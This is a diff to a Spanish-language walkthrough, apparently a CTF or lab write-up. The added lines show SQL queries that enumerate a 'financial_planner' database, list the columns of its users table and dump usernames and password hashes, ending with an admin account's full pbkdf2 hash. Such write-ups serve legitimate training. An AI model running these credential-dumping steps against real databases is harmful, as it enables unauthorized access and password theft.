@@ -38,4 +38,9 @@ Seleccionamos la bese de datos que queremos enumerar `USE financial_planner;`
 
 Enumeramos las tablas  de esta con `SELECT TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES  WHERE TABLE_TYPE = 'BASE TABLE';`
 
-Encontramos columnas llamdas username y password_hash 
+Encontramos una tabla llamada users y la enumeramos con `SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';`
+
+Y vemos las columnas username y password_hash vemos el contenido con `SELECT username, password_hash FROM users;`
+
+Nos devuelve un usuario `admin` con un hash `pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`
+
